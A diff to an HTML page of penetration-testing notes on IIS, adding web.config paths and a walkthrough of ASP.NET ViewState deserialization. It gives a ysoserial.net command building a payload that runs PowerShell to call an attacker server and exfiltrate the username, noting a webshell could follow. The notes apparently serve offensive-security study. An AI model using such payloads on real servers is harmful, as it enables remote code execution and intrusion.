@@ -27,7 +27,8 @@
             <ul>
                 <p>Common paths for IIS</p>
                 <pre><code class="language-bash">C:\inetpub\
- C:\inetpub\wwwroot\</code></pre>
+C:\inetpub\wwwroot\
+C:\inetpub\wwwroot\web.config</code></pre>
                 <p>Not confuse with intsrv <b>(c:\windows\system32\inetsrv)</b> where the configuration files are located</p>       
             
                  <h3>IIS Tilde Enumeration</h3>
@@ -55,6 +56,43 @@
 
             <h2>Exploitation</h2>
             <ul>    
+                <h3>ASP.NET ViewState Deserialization Attack</h3>
+                <ul>
+                    <p>First of all let's understand what this is about. Web Forms are a component of the ASP.NET web application framework. This thing is a bit old but there are many websites which uses web forms still</p>
+                    <p>This component uses a function called <b>VIEWSTATE</b> which is used to store the current state of the website. <b>Example:</b>In case you have a website with the typical ShoppingCart in case you have some items inside this ShoppingCart the VIEWSTATE will store this information in a field called <b>__VIEWSTATE</b> This information will stayed serialized and then passed from the client to the server. Once the server get's it, it will be deserialized and the clean data will be processsed</p>
+                    <p>In order to exploit this we will need to have access to <b>web.config</b> which contains the keys. Here is a code snip of the file</p>
+                    <pre><code class="language-bash">&lt;machineKey 
+    validationKey="YourSecretKeyHere" 
+    decryptionKey="YourDecryptionKeyHere" 
+    validation="HMACSHA256" 
+    decryption="AES" /&gt;</code></pre>
+                    <p>Here we can see some important parameters</p>
+                    <ul>
+                        <li><b>validationKey:</b> Used to create and verify the MAC (Message Authentication Code)</li>
+                        <li><b>decryptionKey:</b> Used to encrypt/decrypt the ViewState data </li>
+                        <li><b>validation:</b> Hashing algorithm (SHA1, HMACSHA256, HMACSHA512)</li>
+                        <li><b>decryption:</b> Encryption algorithm (AES, 3DES)</li>
+                    </ul>
+
+                    <p>Now that we have a clear view of the different components we will describe the <b>musts</b> to exploit this</p>
+                    <ul>
+                        <li><b>Known or Weak Machine Key</b></li>
+                        <li><b>Disabled or Bypassed MAC Validation</b></li>
+                        <li><b>Presence of Deserialization Gadget Chains</b></li>
+                    </ul>
+                    
+                    <p>Once we identifyed the request where we could be able to inject our payload we will begin generating the payload itself. To do so we will use a tool called <a class="notion-link" href="https://github.com/pwntester/ysoserial.net"><b>ysoserial.net</b></a></p>
+                    <p>Here are few commands which could serve as help using ysoserial.net</p>
+                    <p>First of all we need to setup the plugin. We can use the following command to list the available plugins. For our case we need <b>ViewState</b></p>
+                    <pre><code class="language-cmd">.\ysoserial.exe -p help</code></pre>
+                    <p>Now that we have clear the plugin. We can use the following commands to list examples of how to use it</p>
+                    <pre><code class="language-cmd">.\ysoserial.exe -p viewstate --examples</code></pre>
+                    <p>This will list different examples. Have in mind that there is a parameter <b>(-g)</b> which is the the gadget chain. In case using any gadget does not work we can try anotherone and pray</p>
+                    <p>Here goes an exaple of command to exploit it where we will perform a webrequest to our attacker server but we could use any powershell command in order to stablish a webshell</p>
+                    <pre><code class="language-cmd">.\ysoserial.exe -p ViewState -g TypeConfuseDelegate -c "powershell.exe Invoke-WebRequest -Uri http://10.10.14.91:8000/$env:UserName" --decryptionalg="AES"  --path="/portfolio" --decryptionkey="74477CEBDD09D66A4D4A8C8..." --validationalg="SHA1" --validationkey="5620D3D029F914F4CDF25869..."</code></pre>
+                    <p>Once executed ysoserial will provide the payload in order to inject in the <b>__VIEWSTATE</b> parameter of the post request. Then send the request and stablish the webshell or execute the command</p>
+                </ul>
+                
                 <h3>IIS 6.0</h3>
                 <ul>
                     <p>The IIS 6.0 contains a buffer overflow vulnerability in the ScStoragePathFromUrl function in the WebDAV</p>
